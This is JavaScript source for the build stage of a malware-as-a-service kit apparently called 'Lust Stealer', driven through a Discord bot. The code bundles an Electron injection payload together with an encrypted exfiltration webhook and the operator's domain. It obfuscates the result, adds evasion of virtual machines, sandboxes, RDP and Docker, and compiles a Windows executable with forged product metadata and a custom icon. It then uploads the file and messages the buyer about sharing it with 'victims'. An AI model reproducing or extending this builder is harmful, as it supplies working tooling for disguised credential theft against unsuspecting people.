import path from "node:path";
import crypto from "node:crypto";
import { setTimeout as sleep } from "node:timers/promises";
import zlib from "node:zlib";
import fs from "fs-extra";

import * as web from "./web.js";
import * as keyutil from "./keyutil.js";
import config from "./config.js";
import hideWindow from "./hideWindow.js";
import { saveIcon } from "./icons.js";

import buildPackageJson from "./build/package.json" assert { type: "json" };

import { rollup } from "rollup";
import randomstring from "randomstring";
import setil from "setil";
import { execaNode } from "execa";
import yn from "yn";

import rollupCommonjs from "@rollup/plugin-commonjs";
import rollupNodeResolve from "@rollup/plugin-node-resolve";
import rollupJson from "@rollup/plugin-json";
import rollupReplace from "@rollup/plugin-replace";
import rollupJSNative from "rollup-plugin-jsnative";
import rollupCleanup from "rollup-plugin-cleanup";
import rollupDirectImport from "rollup-plugin-direct-import";
import rollupConfuser from "rollup-plugin-confuser";

export default async function build(interaction, config, userprofile) {
  const m = await interaction.messageReply("Build in progress...");

  // Modal Options
  const name =
    interaction.fields.getTextInputValue("name") || config.defaultName;
  const description =
    interaction.fields.getTextInputValue("description") ||
    config.defaultDescription;
  const copyright = interaction.fields.getTextInputValue("copyright") || "";
  const company =
    interaction.fields.getTextInputValue("company") || config.defaultCompany;
  const hide = yn(interaction.fields.getTextInputValue("hidewindow"), {
    default: true
  });

  const ico = await saveIcon(userprofile.key).catch(console.error);

  const file = await buildFile(userprofile.publicKey, {
    name,
    description,
    copyright,
    company,
    hide,
    icon: ico ? path.resolve("icon.ico") : path.resolve("default_icon.ico"),

    // Advanced
    blockVm: userprofile.blockVm ?? true,
    blockHost: userprofile.blockHost ?? false,
    blockHttpSim: userprofile.blockHttpSim ?? true,
    blockRdp: userprofile.blockRdp ?? false,
    blockDocker: userprofile.blockDocker ?? false
  }).catch(console.error);

  await fs.remove("output").catch(console.error);

  if (!file)
    return m.edit(
      "**❌ Cannot build your file right now, try again later.**\n> If this continues, contact an admin instantly."
    );

  // Add build to database
  const buildId = file.split(".")[0];
  await keyutil.addBuild(userprofile.key, buildId);

  // Notify the user
  await interaction.user.send(
    `**⚠️ You Can Download Only One Time!**\n> Do not share this url with your victim.\n> Download the file then upload it somewhere in order to share it to your victims.\n||<${config.baseURL}/files/${file}?key=${userprofile.publicKey}>||\n\nJoin our Telegram: <https://t.me/luststealer>`
  );

  await m.edit("Sent the download link to your DM");

  return true;
}

async function buildFile(userPublicKey, options = {}) {
  // Options
  const buildId = randomstring.generate(7);
  const name = options.name?.replace(/[^A-Za-z0-9\s]/g, "");

  // Paths
  const entrypath = path.resolve("build", "index.js");
  const outpath = path.resolve("output", `${buildId}.exe`);
  const editpath = path.resolve("output", `${buildId}.edited.exe`);
  const injectpath = path.resolve("build", "inject");
  const gzpath = outpath + ".gz";

  // Vars
  const version = buildPackageJson.version + ".0";
  const webhook = AESEncrypt(userPublicKey, config.privateKey);
  const obfOptions = {
    renameVariables: false,
    controlFlowFlattening: 0,
    globalConcealing: false,
    stringCompression: 0.5,
    stringConcealing: 0.5,
    stringEncoding: 0.5,
    stringSplitting: 0.5,
    deadCode: 0.5,
    calculator: 0,
    compact: true,
    movedDeclarations: false,
    objectExtraction: false,
    stack: 0,
    duplicateLiteralsRemoval: 0,
    flatten: false,
    dispatcher: 0,
    opaquePredicates: 0,
    shuffle: { hash: 0, true: 0 }
  };

  await fs.ensureDir("output");

  const injectionbundle = await rollup({
    input: path.join(injectpath, "core.js"),
    cache: false,
    onwarn: () => {},
    external: ["electron"],
    plugins: [
      rollupCommonjs({ requireReturnsDefault: "auto" }),
      rollupNodeResolve({ preferBuiltins: true }),
      rollupCleanup({ comments: "none", sourcemap: false }),
      rollupReplace({
        preventAssignment: true,
        values: {
          WEBHOOK_ENCRYPTED_SECRET: webhook,
          WEBHOOK_PRIVATE_KEY: config.privateKey,
          LUST_CONFIG_DOMAIN: config.baseURL
        }
      }),
      rollupConfuser({
        options: obfOptions
      })
    ]
  });

  const { output: injection } = await injectionbundle.generate({
    format: "cjs"
  });

  await injectionbundle.close();

  if (!Array.isArray(injection) || injection.length > 1) return false;

  const mainbundle = await rollup({
    input: entrypath,
    cache: false,
    onwarn: () => {},
    plugins: [
      rollupCommonjs({ requireReturnsDefault: "auto" }),
      rollupNodeResolve({ preferBuiltins: true }),
      rollupJSNative(),
      rollupJson(),
      rollupReplace({
        preventAssignment: true,
        values: {
          WEBHOOK_ENCRYPTED_SECRET: webhook,
          WEBHOOK_PRIVATE_KEY: config.privateKey,
          LUST_CONFIG_DOMAIN: config.baseURL,
          LUST_BUILD_NAME: name,
          LUST_CONFIG_BLOCK_VM: String(options.blockVm),
          LUST_CONFIG_BLOCK_HOST: String(options.blockHost),
          LUST_CONFIG_BLOCK_HTTP_SIM: String(options.blockHttpSim),
          LUST_CONFIG_BLOCK_RDP: String(options.blockRdp),
          LUST_CONFIG_BLOCK_DOCKER: String(options.blockDocker),
          LUST_CONFIG_VERSION: buildPackageJson.version,
          LUST_STARTUP_NAME: buildId
        }
      }),
      rollupCleanup({ comments: "none", sourcemap: false }),
      rollupDirectImport({
        injectIndex: {
          value: fs.readFileSync(path.join(injectpath, "index.js"), "utf-8"),
          type: "text"
        },
        injectCore: {
          value: injection[0].code,
          type: "text"
        }
      }),
      rollupConfuser({
        global: false,
        include: [
          "build/index.js",
          "build/util/*.js",
          "build/config/*.js",
          "build/globals.js"
        ],
        options: obfOptions
      })
    ]
  });

  const { output } = await mainbundle.generate({
    format: "cjs"
  });

  await mainbundle.close();

  if (!Array.isArray(output) || output.length > 1) return false;

  await setil
    .compile(output[0].code, outpath, {
      disableSeaWarning: true
    })
    .catch(console.error);

  if (!fs.pathExistsSync(outpath)) return false;

  await sleep(100);

  await editExe(outpath, editpath, {
    version,
    name,
    description: options.description,
    copyright: options.copyright,
    company: options.company,
    icon: options.icon
  });

  if (!fs.pathExistsSync(editpath)) return false;

  if (options.hide) await hideWindow(editpath, editpath);

  await compressFile(editpath, gzpath);

  if (!fs.pathExistsSync(gzpath)) return false;

  const uploaded = await web.upload({
    source: new Blob([fs.readFileSync(gzpath)]),
    filename: path.basename(gzpath)
  });

  if (!uploaded) return false;

  return uploaded;
}

function AESEncrypt(text, key) {
  const iv = crypto.randomBytes(16);
  const salt = crypto.scryptSync(key, "salt", 32);
  const cipher = crypto.createCipheriv("aes-256-cbc", salt, iv);
  let encrypted = cipher.update(text, "utf8", "hex");
  encrypted += cipher.final("hex");
  return iv.toString("hex") + ":" + encrypted;
}

async function editExe(
  input,
  output,
  { version, icon, name, description, copyright, company }
) {
  const exeEditPath = path.resolve("node_modules", "exe-edit", "out", "cli.js");
  const productVersion = version.split(".").slice(0, 3).join(".");
  const versionOptions = {
    LegalCopyright: copyright,
    CompanyName: company,
    ProductName: name,
    InternalName: name,
    OriginalFilename: name + ".exe",
    FileDescription: description,
    ProductVersion: productVersion
  };

  const args = [
    input,
    output,
    "--file-version",
    version,
    "--product-version",
    productVersion,
    ...Object.keys(versionOptions)
      .map((k) => ["--set-version", k, `${versionOptions[k]}`])
      .flat(2)
  ];

  if (typeof icon === "string") args.push("--icon", `${icon}`);
  else args.push("--no-icon");

  return await execaNode(exeEditPath, args);
}

async function compressFile(input, output) {
  return new Promise((resolve) =>
    fs
      .createReadStream(input)
      .pipe(zlib.createGzip())
      .pipe(fs.createWriteStream(output))
      .on("finish", resolve)
  );
}
